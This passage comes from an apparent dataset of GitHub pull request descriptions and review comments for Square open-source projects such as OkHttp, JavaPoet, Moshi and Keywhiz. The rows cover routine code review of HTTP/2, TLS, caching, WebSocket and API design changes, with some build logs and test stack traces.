'LGTM\r\n\r\nDIG']"
681,square/dagger,296.0,"* Invalid return type should invoke 'continue' in the outer loop.
* Use static typing for 'Provider' and 'Lazy' types.

cc/ @tbroyer","['LGTM', 'LGTM\r\n\r\nShould anyone else review before merge?', 'LGTM']"
682,square/javapoet,185.0,"Drop a convenience overload for addParameter that was inconsistent;
we don't have similar shortcuts for fields.

Also restore peerNamed() needed by Dagger 2.","[""I feel this is still a little bit awkward, but I think it's at least more regular which is a good starting point. It's the result of attempting to port one project over to JavaPoet from JavaWriter 2."", 'LGTM']"
683,square/javapoet,202.0,"This uses dynamic proxies to implement Type interfaces to work
around problems building TypeVariable on Java 8.

This removes IntersectionType, and just uses a list of bound types
when necessary.",['![screen shot 2015-01-25 at 11 25 30 am](https://cloud.githubusercontent.com/assets/133019/5892213/e5c0fc98-a484-11e4-808a-944ef3a9b016.png)\r\n']
684,square/javapoet,208.0,Being non-ASCII isn't relevant.,[]
685,square/javapoet,209.0,"This introduces our own type name hierarchy, inspired by the one
originally in Dagger 2.

This one is called TypeName. Instances are immutable and implement
equals() and hashCode() properly.",[]
686,square/javapoet,215.0,Closes https://github.com/square/javapoet/issues/211,"['I have signed the CLA.', ""Nice. Just some feedback on copyright statements and code style. Address, squash & I'll merge.\r\n\r\nSee http://rebaseandsqua.sh for squashing instructions."", 'Alright, gonna fix that.', 'Ready for merge :)', 'Thanks!', ""You're welcome :)""]"
687,square/javapoet,229.0,"Anyone know a good way to test this without writing a novel of mocking? I filed https://github.com/google/compile-testing/issues/65 which seems like it would be a good approach.

Closes #228.","[""Also, two questions:\r\n * Do we copy method annotations?\r\n * Do we copy param annotations?\r\n\r\nCopying type annotations seems like an obvious yes but we don't support that yet (#136)."", ""Make sure you don't get two `@Override` annotations if one is already present.\r\n\r\nOn copying over annotations, we should do what IntelliJ does: copy 'em. Though we need API to remove annotations too.\r\n\r\nOn testing, can you do what TypesTest does to get Elements for the current file?"", ""PTAL.\r\n\r\nCopying annotations requires non-trivial infrastructure around being able to create `AnnotationSpec`'s from `AnnotationMirrors` which I'll do in a follow-up."", 'LGTM']"
688,square/javapoet,293.0,"In response to issue #238 I added in the ability to use indexes in the format strings.

I used the $-index-format syntax discussed in that thread and made the index start at one to be consistent with the way that java formatters act.","['This is wonderful, thank you!\r\n\r\nPlease complete our contributors paperwork so we can redistribute your code:\r\nhttps://github.com/square/javapoet/blob/master/CONTRIBUTING.md\r\n', 'I added in fixes to the comments you left above and completed the contributors form. I hope all looks well.', ""I checked your CLA. Looks good.\r\n\r\nMind adding two more short test cases that might catch a problem in the code? Also please use http://rebaseandsqua.sh to get only a single commit for this change.\r\n\r\nAnd then I'll merge this. Thanks!"", ""Just when I was about to get started on #238 I see that the work has already been done. That's great :+1: :) Looking forward for this being merged."", 'My apologies for sitting on this for 17 days. I missed the notification on your updated push.\r\n\r\nLGTM, thanks!']"
689,square/keywhiz,19.0,"* Fixes Security Headers
* Fixes dev config
* Adds default username/password to https://square.github.io/keywhiz/
","[""I'll try to write some tests to make sure we don't have a regression in the future."", 'Shoot, I thought there was an integration test for these headers. Take a look at `UiAssetsBundleTest` for a similar test setup.', 'LGTM after the comments I just added. Looks like a rebase is needed to make the branch mergeable.']"
690,square/keywhiz,36.0,"I'm splitting the alok/jooq branch into smaller chunks. This is the first one.

We might be able to use https://github.com/benjamin-bader/droptools/tree/master/dropwizard-jooq at some point, but I think we should do that once all the code is moved to jooq and the jdbi stuff is gone.","['LGTM after comments', ':+1: Nice work']"
691,square/keywhiz,38.0,"Splitting the alok/jooq branch into smaller chunks. This is the 2nd such chunk.

AclDeps is a temporary class which will be removed once ClientDAO, GroupDAO, SecretContentDAO and SecretSeriesDAO are converted to jooq and can be injected.","['I believe I addressed all the comments.', 'Looks pretty good. Added a few new comments and needs a rebase.', ':+1: ']"
692,square/keywhiz,52.0,I tried to split this into multiple smaller pieces but there is a transaction boundary in SecretDAO which makes it hard to mix jdbi and jooq.,[':+1: ']
693,square/keywhiz,92.0,"Adds support for H2, MySQL and provides an easy way to switch between the different databases.",[':+1: ']
694,square/keywhiz,94.0,"This should address https://github.com/square/keywhiz/issues/42, https://github.com/square/keywhiz/issues/64, and https://github.com/square/keywhiz/issues/65",[':+1: ']
695,square/moshi,42.0,"This is a fun new API that could make writing JSON adapters
much easier.",['LGTM']
696,square/moshi,47.0,"Works like JSR-330's @Qualifier annotation. You may have
multiple qualifiers, or none.",['LGTM! Awesome stuff.']
697,square/moshi,49.0,,['Just style things. Not strictly required. LGTM.']
698,square/moshi,54.0,,['LGTM']
699,square/okhttp,299.0,,"[""Implements reading only, but doesn't go so far as to handle the consumed headers."", '@mescortes @JakeWharton ', 'LGTM w/ comments']"
700,square/okhttp,438.0,"Changed all internal use of NPN protocol identifier strings to use a corresponding value a new public enum: `Protocol`.
","['Nice change.\r\n\r\nI\'ve got a bunch of drive-by comments mostly on the consequences of your change. Having a tight seem between private and public API is very difficult in Java programs if you\'re to have any internal packages.\r\n\r\nThoughts on making the Protocol type an enum?\r\n\r\nWhat happens in three months when we want to ship HTTP/2 draft 12? Do we delete the old protocol, or do we keep it around? Public APIs so tough. The ""nice"" thing about strings is that we didn\'t expose symbols in our public API.', 'Thanks for taking a look!\n\nThoughts from small keyboard...\n\nAgree with feedback.  I started this as an enum, then switched back, but\nyeah I think it could be better as one, particularly to help with switch\nand equals.\n\nWe could make the value of protocol.name change for http2 since it is a\ndraft protocol.  Ex. Have a Protocol.HTTP_2 with .name or .identifier being\nthe draft for now..\n\nWdyt?', 'Yup, this would work:\r\n  HTTP_11, SPDY and HTTP_2 \r\n\r\nInternally SPDY might be ""spdy/3"" today and ""spdy/3.1"" tomorrow. HTTP/2 could also change over time.', 'ok will fix this up in a day or so', 'sorry took so long.  PTAL', 'LGTM', 'Thx for the feedback. Will fixup shortly.', ""PTAL\r\n\r\nI've duplicated `OkHeaders.SELECTED_TRANSPORT` as `OkHeaders.SELECTED_PROTOCOL`, assuming we'd remove the former in OkHttp 2.1.  I also added `Protocol.spdyVariant` as that removed some duplication of code."", 'build fail was unrelated transient.', 'LGTM']"
701,square/okhttp,455.0,"close issue #447

@swankjesse Any ideas on how best to test this without being flakey?","[""LGTM\r\n\r\nIt's a lot of code to write a test that sets up both halves of TLS connection. But you could do that if you want to write a test. I don't feel too strongly.\r\n\r\nIf you want to test it manually, I think you'll end up fixing `https://gmail.com` with this change. Today we pick HTTP/2 when we should be picking spdy/3."", 'PTAL I needed a tweak, and now ExternalSpdyExample and ExternalHttp2Example work as expected.', 'LGTM']"
702,square/okhttp,485.0,"I'm unhappy with java.io:
 * No timeouts.
 * Every layer needs to copy bytes around. Always copying bytes.
 * Features like mark/reset and available() are clumsy.
 * Its awkard in mixed text/binary protocols like HTTP because
   character decoding is separate and takes over the stream.

Unfortunately java.nio isn't better, just different:
 * It's complex.
 * Buffers are fixed size.
 * No built-in buffer pooling.
 * Features like mark/reset/position are clumsy.

This is an obnoxious attempt at a 3rd I/O interface, mostly
inspired by InputStream and OutputStream, but using growable
buffers instead of byte arrays as the core data container.","[""way cool\r\n\r\nLGTM (note there's a check style error)"", ""Merging on Adrian's LGTM and a local successful build. Others' comments & feedback very welcome.""]"
703,square/okhttp,487.0,This is more complicated than I'd anticipated.,['LGTM']
704,square/okhttp,486.0,This is the final change for connection-level flow control in spdy or http/2.,"[""One missing synchronized block. Is it safe to grab the connection lock while holding the stream lock? I'm hoping it is."", 'grabbed a connection lock, outside the stream lock.  should be good to go!']"
705,square/okhttp,512.0,Quiet down find bugs on some areas of the codebase.  Address a couple glitches find bugs didn't catch.,"['LGTM\r\n\r\nWith one actionable comment.', 'split the test and corrected the comment on ByteString.equalsAscii wrt not using String.equals']"
706,square/okhttp,498.0,Moved the check of Http Methods to okHttp maintaining the same logic but with the addition of PATCH in the allowed methods.,"['Should PATCH invalidate the caches?\r\n\r\ncom.squareup.okhttp.HttpResponseCache#maybeRemove', 'My read is that PATCH should have the same implication on the cache as a\nPUT on the same resource.', 'agreed!', ""Thanks for the help.  I've verified that PATCH per spec indeed should invalidate the cache.  Outside nits, please put in test cases, since the behavior has changed. 1. we now accept PATCH 2. cache is invalidated"", 'fixed styleCheck errors', 'thx!']"
707,square/okhttp,510.0,"Needs tests in a follow up. In particular for the new
methods on OkBuffer (peekByte, skip, indexOf) and for
all of the weird header cases on gzip data (headers
that include names, comments, extra fields, header
CRCs), plus failing cases for header CRC, CRC and
ISIZE.","['OkHttp seems to be a place where binary formats can hang out in new clothes', ""only editorial comments beyond the ones you've made.  I'm heads down until my talk tomorrow, else I'd finish this for us!"", '@swankjesse squash the commit I added if you like.  should be good to go', 'one sec. forgot the header crc test.', 'ok all tests are backfilled.  One thing interesting is that it seems a lot of gzip implementations in the wild use an old version of gzip which thinks the HCRC flag is continuation.  Very few implement either.  For example, if you compress with the HCRC and read it in vanilla osx gzip, it thinks the thing is multipart!!\r\n\r\n```bash\r\necho H4sIAgAAAAAAAB0m8yxRL1ZIVAj184xQKK4sLknNVVTwVMjOyy9XKMnILFYEAI2PrTcgAAAA|base64 --decode|gunzip -l -v -gzip: stdin is a a multi-part gzip file -- not supported\r\n```', 'LGTM', 'okie rewrote the test to use constants and squashed']"
708,square/okhttp,518.0,closes #184,"['PTAL', 'LGTM\r\n\r\nTest to check sure multiple copies created with copyWithDefaults() get the same SSLSocketFactory? Seems like the sort of behavior that could bitrot away without a test.', 'Will do.']"
709,square/okhttp,527.0,@swankjesse @adriancole ,"[""Let's omit post-as-get and data-as-query until somebody requests 'em?"", 'PTAL', '```\r\n[INFO] ------------------------------------------------------------------------\r\n[INFO] Reactor Summary:\r\n[INFO]\r\n[INFO] OkHttp (Parent) ................................... SUCCESS [1.772s]\r\n[INFO] OkHttp SPDY and HTTP/2.0 internals ................ SUCCESS [8.885s]\r\n[INFO] MockWebServer ..................................... SUCCESS [10.943s]\r\n[INFO] OkHttp ............................................ SUCCESS [51.121s]\r\n[INFO] OkHttp Apache HttpClient .......................... SUCCESS [1.492s]\r\n[INFO] OkCurl ............................................ SUCCESS [3.823s]\r\n[INFO] Samples (Parent) .................................. SUCCESS [0.243s]\r\n[INFO] Sample: Guide ..................................... SUCCESS [0.620s]\r\n[INFO] Sample: Simple Client ............................. SUCCESS [0.691s]\r\n[INFO] Sample: Static Server ............................. SUCCESS [1.604s]\r\n[INFO] Benchmarks ........................................ SUCCESS [1.441s]\r\n[INFO] ------------------------------------------------------------------------\r\n[INFO] BUILD SUCCESS\r\n[INFO] ------------------------------------------------------------------------\r\n[INFO] Total time: 1:22.869s\r\n[INFO] Finished at: Fri Feb 14 09:04:18 PST 2014\r\n[INFO] Final Memory: 94M/701M\r\n[INFO] ------------------------------------------------------------------------\r\n```', 'LG']"
710,square/okhttp,557.0,,['LG; and looking forward to it!']
711,square/okhttp,563.0,"```java
MockResponse response = new MockResponse().setBody(""ABCDE"").setStatus(""HTTP/1.1 200 Sweet"")
    .withPush(new PushPromise(""GET"", ""/foo/bar"", Arrays.asList(""foo: bar""),
        new MockResponse().setBody(""bar"").setStatus(""HTTP/1.1 200 Sweet"")));
```","['I think your current, not-too-fluent API is just fine. MockWebServer code is currently pretty minimal in API conveniences!', 'okie fixed the close thing, and will look into how to hook in client processing of push.', 'LGTM']"
712,square/okhttp,574.0,"This allows OkHttp to continue supporting java.net.ResponseCache,
which is desirable for Android's HttpURLConnection
implementation.

Also mixed in is a fix for response header at index 0 not being the
status line (looks like a regression introduced by commit bc25934).","[""I don't consider this finished, but there's enough to discuss."", ""Looking good. If you don't mind addressing the nits, I'd love to merge this."", ""I attempted to build this tonight and found a few small problems:\r\n\r\n * I moved the tests to the okhttp-tests package. You'll need to track this:\r\n\r\n```\r\ngit mv okhttp/src/test/java/com/squareup/okhttp/internal/http/ResponseCache* okhttp-tests/src/test/java/com/squareup/okhttp/internal/http/\r\n```\r\n\r\n * Changing the indices of headers is surprising. Please split that off into a separate PR? We'll figure out where we introduced the difference with the RI. Might have been with OkHttp, or with AOSP. I'm not completely convinced we actually want this change, but regardless it's outside the scope of this change.\r\n\r\n * Fixing `Default` to `value`."", 'As my 8 year old would say: Epic!\r\n\r\nThanks!']"
713,square/okhttp,604.0,"This was breaking an Android test and appears not to be part of the spec for
HttpURLConnection.

To fix the test fully another change was required to add additional headers.

Also added are some tests ported over from Android that test
CookieHandler/CookieManager and improve coverage of this area.",['LGTM']
714,square/okhttp,619.0,,['LGTM. Looks like a hung test on CI.']
715,square/okhttp,764.0,"One call to rule them all.

```java
  Call call = client.newCall(request); // cancelable
  call.execute(callback); // async
  // or (exclusive)
  response = call.execute(); // blocking
```","['CallTest now has a lot of duplication.. we can either pick through it now, or later.', 'cc @jhump ', 'LGTM', 'OK! updated to make blocking calls cancelable with tests.  PTAL']"
716,square/okhttp,792.0,"This is a WIP branch, and will probably complete this weekend.

- [x] update hpack to draft 07
- [x] update http/2 to draft 12

closes #772","['added commit for the http/2 impl.  I still need to backfill tests, but should be a decent start for review.\r\n\r\n```\r\n$ okcurl/target/okcurl-2.0.0-SNAPSHOT-jar-with-dependencies.jar --frames -X HEAD https://twitter.com\r\n>> CONNECTION 505249202a20485454502f322e300d0a0d0a534d0d0a0d0a\r\n>> 0x00000000     5 SETTINGS      \r\n>> 0x00000003    60 HEADERS       END_STREAM|END_HEADERS\r\n<< 0x00000000     0 SETTINGS      ACK\r\n<< 0x00000000     5 SETTINGS      \r\n>> 0x00000000     0 SETTINGS      ACK\r\n<< 0x00000003   683 HEADERS       END_STREAM|END_HEADERS\r\n>> 0x00000000     8 GOAWAY        \r\n```', ""Note that the priority scheme is completely incompatible, so I changed our internal impl accordingly.  We still don't take action, but at least it is more clear."", 'LGTM love it', 'Thanks for all the feedback.  Will address in the morning with the missing\ntests. Ps I read up more on altsvc so will clarify some docs and will put\nsome test cases in with frames that have realistic values.', 'ok fixed per comments and got it rebased etc. will test against netty and backfill some tests. eta a couple hrs.', ""ok: ready to go.\r\n\r\nI backfilled the tests and decided not to *enable* per-frame compression.  That feature is probably intended for message-oriented protocols and isn't worth plumbing through everything."", 'ps travis is doing this a lot. https://github.com/square/okhttp/issues/800']"
717,square/okhttp,811.0,"This enforces that we should only receive lowercase headers, as it says in the spec.  I've verified that twitter and netty follow this rule.
","['I enforced that we should only receive lowercase headers, and verified that twitter and netty follow that as well.\r\n\r\nPTAL', ""I removed the streaming aspect after profiling showed that it didn't help.  The impl in this PR runs through the example [huffman encoded example frames](http://tools.ietf.org/html/draft-ietf-httpbis-header-compression-07#appendix-D.4) significantly faster.\r\n\r\nbefore\r\n```\r\nBenchmark                             Mode   Samples         Mean   Mean error    Units\r\nc.s.o.i.s.Hpackers.okHttpHuffman     thrpt        50     1144.228       11.257   ops/ms\r\n```\r\n\r\nwith this PR\r\n```\r\nBenchmark                             Mode   Samples         Mean   Mean error    Units\r\nc.s.o.i.s.Hpackers.okHttpHuffman     thrpt        50     1226.562       16.435   ops/ms\r\n```""]"
718,square/okhttp,858.0,"fixes #855, presuming the user calls `connection.setFixedLengthStreamingMode(0)`. ","['LGTM', 'ok.. I think this should get into 1.6']"
719,square/okhttp,954.0,"Closes #945 

Notably increases setting id from 8 to 16 byte, drops spurious frame types, accepts unknown frames, simplifies padding.

Tested on twitter

```bash
$ okcurl/target/okcurl-2.0.0-SNAPSHOT-jar-with-dependencies.jar --frames -X HEAD https://twitter.com
>> CONNECTION 505249202a20485454502f322e300d0a0d0a534d0d0a0d0a
>> 0x00000000     6 SETTINGS      
>> 0x00000000     4 WINDOW_UPDATE 
>> 0x00000003    60 HEADERS       END_STREAM|END_HEADERS
<< 0x00000000     0 SETTINGS      ACK
<< 0x00000000     6 SETTINGS      
>> 0x00000000     0 SETTINGS      ACK
<< 0x00000003   675 HEADERS       END_STREAM|END_HEADERS
>> 0x00000000     8 GOAWAY
```","['LGTM. If we measure spec revisions by the amount of code they add and remove, it looks like 13 is a clear winner.', 'drat. this missed the 2.0.0 cut.', '2.0.1 !', 'pronounce two oh won!']"
720,square/okhttp,976.0,"For isssue square/okhttp#931 this creates a submodule referencing http2jp/hpack-test-case, and runs the decoder across each of the directories for interop testing.  Many of these fail, so they're in an @Ignored bad test.

Another test added does a round trip of headers through our encoder and decoder -- this test is not quite as effective as having known good output of our own in http2jp/hpack-test-case so that's next.","['LGTM. Please address issues above, and squash your commits!', 'Do you need to `git push -f`  ? ', 'OK all set ramping up on tools.', ""Some comments might not have been addressed, ex. the copyright. Please scan back through and make sure the commit that is visible includes them. Also, I would take a little time to make the README clear at least on the process to initialize the project and what to do when the hpack tests upstream project changes. Since we are linking to something else, we want to ensure the maintenance aspect of this isn't subject to bus factor.\r\n\r\notherwise LGTM and I will look at the failing tests for relevance, etc once merged."", 'k should be all set', ""Just got back from vacation and finally circling back to this. This looks awesome. I'm eager to put it to use.""]"
721,square/okhttp,1082.0,Closes https://github.com/square/okhttp/issues/606,"['Looks great. Tiny things only.', 'LGTM']"
722,square/okhttp,1087.0,"Now we explicitly enable TLSv1.2, TLSv1.1 and TLSv1.0 where they are supported.
We continue to perform only one fallback, to SSLv3.

In a follow-up we can make TLS configurations user-accessible, and allow the
application to limit which versions are used.","['Towards https://github.com/square/okhttp/issues/815.', 'LGTM. Not super comfortable with this area of the code though.', ""Thanks for the review.\r\n\r\nParticularly thanks for catching my cowboy API changes. I suspect nobody is using these, 'cause there's nothing useful you can do with 'em. Some of the address/connection/route code is public for implementation benefits rather than API benefits! Sigh. Regardless, I've fixed to keep compatibility.\r\n\r\nIt's easy to decide what parts of the API should be public for making requests and reading responses. It's harder to figure out what else should be exposed. Some connection pool and cache stuff is exposed for potential benefit of performance monitoring. Route, Address & Connection get dragged along for the ride.\r\n\r\n""]"
723,square/okhttp,1193.0,"I'm anticipating implementing interceptors at two independent parts
of the API. The first is high-level interceptors, that intercept
before the socket connection has been established.

The second set of interceptors will only execute for requests that
require a socket connection. Those are forthcoming.","['Needs rebase.', 'Another potentially interesting usage to test would be calling down the chain more than once in an interceptor.', 'LGTM, though.', 'Initial thoughts are looks good. Will play with this over the week, regardless of merge timing.', 'quick q. some authenticators will need be implemented as interceptors. Do\nwe foresee Authenticator deprecating (if proxy is exposed here)? Or\nbasically wait and see?', ""I hadn't considered exposing HTTP proxies to interceptors. I can imagine it would be much easier to implement application-level authentication with interceptors."", ""FWIW, I've not needed the context of proxy for the type of auth I've done,\nso even without that, authentication interceptors should be good to go.\nI'll make a couple examples: amazon signature, JWT""]"
724,square/okhttp,1205.0,,[]
725,square/okhttp,94.0,,"[""Just some nitpicks. Address 'em and merge!""]"
726,square/okhttp,1248.0,"The trickiest part of this change is the SOCKS 5 proxy implemented
to make testing possible. Fortunately the protocol is very easy, and
shows off Okio.

Closes https://github.com/square/okhttp/issues/1009","[""Test failure is `ConnectionPoolTest.connectionCleanup()`, which is flaky. We're not out of the woods yet. I'll fix that when I tackle https://github.com/square/okhttp/issues/1239 .\r\n\r\n```\r\nTests run: 26, Failures: 1, Errors: 0, Skipped: 0, Time elapsed: 43.659 sec <<< FAILURE! - in com.squareup.okhttp.ConnectionPoolTest\r\nconnectionCleanup(com.squareup.okhttp.ConnectionPoolTest)  Time elapsed: 0.093 sec  <<< FAILURE!\r\njava.lang.AssertionError: expected:<3> but was:<2>\r\n\tat org.junit.Assert.fail(Assert.java:88)\r\n\tat org.junit.Assert.failNotEquals(Assert.java:743)\r\n\tat org.junit.Assert.assertEquals(Assert.java:118)\r\n\tat org.junit.Assert.assertEquals(Assert.java:555)\r\n\tat org.junit.Assert.assertEquals(Assert.java:542)\r\n\tat com.squareup.okhttp.ConnectionPoolTest.connectionCleanup(ConnectionPoolTest.java:449)\r\n```"", 'LGTM!']"
727,square/okhttp,1260.0,"Similar to HTTP and Call, the WebSocketCall is a representation of a pending HTTP request and subsequent upgrade to speak web sockets. Upon synchronous execution you are handed a WebSocket instance for synchronous writing and also pass in a WebSocketListener for async callbacks due to reading.

The API changes in this commits also generalize WebSocket such that it's agnostic to being a client or server peer.

Closes #1173.

Missing tests:

 * [x] Non-101 response
 * [x] Response with failed web socket upgrade (multiple)","[""I think we can get by with just interface for connection-established and also per-message.\r\n```\r\ninterface WebSocketListener {\r\n  void onOpen(Response response, WebSocket webSocket) throws IOException;\r\n  void onMessage(BufferedSource payload, PayloadType type) throws IOException;\r\n  void onClose(int code, String reason);\r\n  void onFailure(IOException e);\r\n}\r\n```\r\nThere would be some lifecycle rules. Normal operation is one call to `onOpen`, any number of calls to `onMessage` and one call to `onClose`. If there's an error, `onFailure` is called, at which point no other callbacks are made."", ""This is forward progress. As you must find majorly annoying, I've taken the opportunity to again review some of the code and the API.\r\n\r\nLGTM because I think this is forward progress. But if you'd like to change the API first, that's fine with me & I'm more than happy to re-review when that's done."", 'PTAL', 'With tests!', 'LGTM nice work!', ""One problem with conflating the initial request/response handshake and the websocket's normal operation is that we lose a clean way to handle it in the server context."", 'Blocking on adding web socket support to MockWebServer for any more of the WebSocketCall testing. Would like to finish getting this PR in before I tackle that (as well as #1241).', ""I merged 'cause it's a big change and I don't want to review the whole thing again! But there's some comments, particularly on cheating with the reader thread, that I'd like you to follow up on!\r\n\r\nWebSockets is already the big feature for OkHttp 2.3.""]"
728,square/okhttp,1267.0,,"['PTAL', 'LGTM', 'Passed on one JDK. Failure looks to be a flake:\r\n```\r\n<<< FAILURE! - in com.squareup.okhttp.internal.http.URLConnectionTest\r\npostFailsWithFixedLengthRequestForLargeRequest(com.squareup.okhttp.internal.http.URLConnectionTest)  Time elapsed: 0.022 sec  <<< ERROR!\r\njava.net.SocketException: Connection reset\r\n\tat java.net.SocketInputStream.read(SocketInputStream.java:189)\r\n\tat java.net.SocketInputStream.read(SocketInputStream.java:121)\r\n\tat okio.Okio$2.read(Okio.java:136)\r\n\tat okio.AsyncTimeout$2.read(AsyncTimeout.java:211)\r\n\tat okio.RealBufferedSource.indexOf(RealBufferedSource.java:255)\r\n\tat okio.RealBufferedSource.indexOf(RealBufferedSource.java:249)\r\n\tat okio.RealBufferedSource.readUtf8LineStrict(RealBufferedSource.java:196)\r\n\tat com.squareup.okhttp.internal.http.HttpConnection.readResponse(HttpConnection.java:188)\r\n\tat com.squareup.okhttp.internal.http.HttpTransport.readResponseHeaders(HttpTransport.java:80)\r\n\tat com.squareup.okhttp.internal.http.HttpEngine.readNetworkResponse(HttpEngine.java:791)\r\n\tat com.squareup.okhttp.internal.http.HttpEngine.readResponse(HttpEngine.java:678)\r\n\tat com.squareup.okhttp.internal.huc.HttpURLConnectionImpl.execute(HttpURLConnectionImpl.java:431)\r\n\tat com.squareup.okhttp.internal.huc.HttpURLConnectionImpl.getResponse(HttpURLConnectionImpl.java:376)\r\n\tat com.squareup.okhttp.internal.huc.HttpURLConnectionImpl.getInputStream(HttpURLConnectionImpl.java:227)\r\n\tat com.squareup.okhttp.internal.http.URLConnectionTest.assertContent(URLConnectionTest.java:3070)\r\n\tat com.squareup.okhttp.internal.http.URLConnectionTest.assertContent(URLConnectionTest.java:3074)\r\n\tat com.squareup.okhttp.internal.http.URLConnectionTest.reusedConnectionFailsWithPost(URLConnectionTest.java:2590)\r\n\tat com.squareup.okhttp.internal.http.URLConnectionTest.postFailsWithFixedLengthRequestForLargeRequest(URLConnectionTest.java:2568)\r\npostFailsWithChunkedRequestForLargeRequest(com.squareup.okhttp.internal.http.URLConnectionTest)  Time elapsed: 0.012 sec  <<< ERROR!\r\njava.net.SocketException: Connection reset\r\n\tat java.net.SocketInputStream.read(SocketInputStream.java:189)\r\n\tat java.net.SocketInputStream.read(SocketInputStream.java:121)\r\n\tat okio.Okio$2.read(Okio.java:136)\r\n\tat okio.AsyncTimeout$2.read(AsyncTimeout.java:211)\r\n\tat okio.RealBufferedSource.indexOf(RealBufferedSource.java:255)\r\n\tat okio.RealBufferedSource.indexOf(RealBufferedSource.java:249)\r\n\tat okio.RealBufferedSource.readUtf8LineStrict(RealBufferedSource.java:196)\r\n\tat com.squareup.okhttp.internal.http.HttpConnection.readResponse(HttpConnection.java:188)\r\n\tat com.squareup.okhttp.internal.http.HttpTransport.readResponseHeaders(HttpTransport.java:80)\r\n\tat com.squareup.okhttp.internal.http.HttpEngine.readNetworkResponse(HttpEngine.java:791)\r\n\tat com.squareup.okhttp.internal.http.HttpEngine.readResponse(HttpEngine.java:678)\r\n\tat com.squareup.okhttp.internal.huc.HttpURLConnectionImpl.execute(HttpURLConnectionImpl.java:431)\r\n\tat com.squareup.okhttp.internal.huc.HttpURLConnectionImpl.getResponse(HttpURLConnectionImpl.java:376)\r\n\tat com.squareup.okhttp.internal.huc.HttpURLConnectionImpl.getInputStream(HttpURLConnectionImpl.java:227)\r\n\tat com.squareup.okhttp.internal.http.URLConnectionTest.assertContent(URLConnectionTest.java:3070)\r\n\tat com.squareup.okhttp.internal.http.URLConnectionTest.assertContent(URLConnectionTest.java:3074)\r\n\tat com.squareup.okhttp.internal.http.URLConnectionTest.reusedConnectionFailsWithPost(URLConnectionTest.java:2590)\r\n\tat com.squareup.okhttp.internal.http.URLConnectionTest.postFailsWithChunkedRequestForLargeRequest(URLConnectionTest.java:2560)\r\n```', ""Wait now it's green on both.. Maybe that was an old build.""]"
729,square/okhttp,1280.0,,['LGTM\r\n\r\nI really like how the tests work.']
730,square/okhttp,1282.0,Closes #1175.,"['LGTM', 'LGTM']"
731,square/okhttp,1332.0,,"['![1 _bash](https://cloud.githubusercontent.com/assets/4540994/5769564/5dcb11ac-9ceb-11e4-8ba2-3aa6ae18a8c2.png)\r\n\r\nSeeing these tests fail on master.  Any ideas?\r\n', 'Yeah, something is unhappy with SSL and the test suite:\r\n\r\n```\r\nTests in error: \r\n  CallTest.matchingPinnedCertificate:864 \xc2\xbb NoSuchMethod sun.security.ssl.SSLSess...\r\n  URLConnectionTest.sslFallbackNotUsedWhenRecycledConnectionFails:635->assertContent:3076->assertContent:3072 \xc2\xbb NoSuchMethod\r\n```\r\n\r\nRunning on Java8 should fix until I investigate & fix. ', ""Nice. This should close https://github.com/square/okhttp/issues/1253\r\n\r\nA few requests and then I'll merge!\r\n\r\n1. Please revert behavior for 206 and 308. I'm not comfortable keeping range-specific responses in the cache.\r\n\r\n2. Please complete out our contributor's agreement:\r\nhttps://docs.google.com/forms/d/13WR8m5uZ2nAkJH41k7GdVBXAAbzDk00vxtEYjd6Imzg/viewform?ndplr=1&formkey=dDViT2xzUHAwRkI3X3k5Z0lQM091OGc6MQ\r\n\r\n3. Also please squash your commits to a single commit so our revision history shows only what we reviewed! Instructions here: http://rebaseandsqua.sh/"", 'Cool, all CR comments addressed.  Btw, if you enjoy using http://rebaseandsqua.sh/ , you might check out https://github.com/jdigger/git-process', 'Thanks!']"
732,square/okhttp,118.0,fix #105 ,"['LGTM, aside from nitpicks']"
733,square/okhttp,124.0,Closes #104.,"['```\r\nTests run: 388, Failures: 0, Errors: 0, Skipped: 12\r\n\r\n[INFO] ------------------------------------------------------------------------\r\n[INFO] BUILD SUCCESS\r\n[INFO] ------------------------------------------------------------------------\r\n[INFO] Total time: 20.651s\r\n[INFO] Finished at: Tue Feb 26 23:18:17 PST 2013\r\n[INFO] Final Memory: 17M/209M\r\n[INFO] ------------------------------------------------------------------------\r\n```']"
734,square/okhttp,130.0,Refs #17.,"['Travis CI FTW! (edit: well it was green when I looked. oh well)', 'LGTM, just one suggestion around newClient/open', 'Updated. Some ugliness crept into the `HttpParams` implementation.', 'LGTM, aside from something bogus in the pom.xml.', '```\r\n[INFO] ------------------------------------------------------------------------\r\n[INFO] Reactor Summary:\r\n[INFO]\r\n[INFO] OkHttp (Parent) ................................... SUCCESS [2.381s]\r\n[INFO] OkHttp ............................................ SUCCESS [27.902s]\r\n[INFO] OkHttp Apache HttpClient .......................... SUCCESS [1.257s]\r\n[INFO] Samples (Parent) .................................. SUCCESS [0.009s]\r\n[INFO] Sample: Simple Client ............................. SUCCESS [0.746s]\r\n[INFO] ------------------------------------------------------------------------\r\n[INFO] BUILD SUCCESS\r\n[INFO] ------------------------------------------------------------------------\r\n[INFO] Total time: 32.569s\r\n[INFO] Finished at: Wed Mar 27 03:29:06 EDT 2013\r\n[INFO] Final Memory: 24M/203M\r\n[INFO] ------------------------------------------------------------------------\r\n```']"
735,square/okhttp,1559.0,This is a behavior change.,['LGTM']
736,square/okhttp,1578.0,"This is very early and subject to change. I'd like to evaluate the API first
because it's difficult to do properly and because if it's done right, the
implementation should be mostly mechanical once this is set.","['Right now I\'m missing a public API to do general encoding & decoding of `application/x-www-form-urlencoded`.\r\n\r\nYou can accomplish the same thing via hacks:\r\n```\r\nHttpUrl url = HttpUrl.parse(""http://foo/"").newBuilder()\r\n    .addQueryParameter(""toppings"", ""lettuce, tomato"")\r\n    .addQueryParameter(""cheese"", ""shredded mozzarella & cheddar"")\r\n    .build();\r\nString requestBody = url.encodedQuery();\r\n```\r\n\r\nPlus similar hacks to do decoding. Or we could have a `Query` class that looks & works a lot like our Headers class.', ""> Right now I'm missing a public API to do general encoding & decoding of application/x-www-form-urlencoded.\r\n\r\nAlso potentially something that could be omitted and just duplicated. I don't think there's any value in exposing something like a `Query` type in the public API."", ""lovin' it. :shipit:""]"
737,square/okhttp,1602.0,"This works for all URL components except for host names. Those are
subject to other types of encoding.","['Working towards https://github.com/square/okhttp/issues/1486', 'LGTM']"
738,square/okhttp,1624.0,,"['LGTM', 'https://github.com/square/okhttp/issues/1486']"
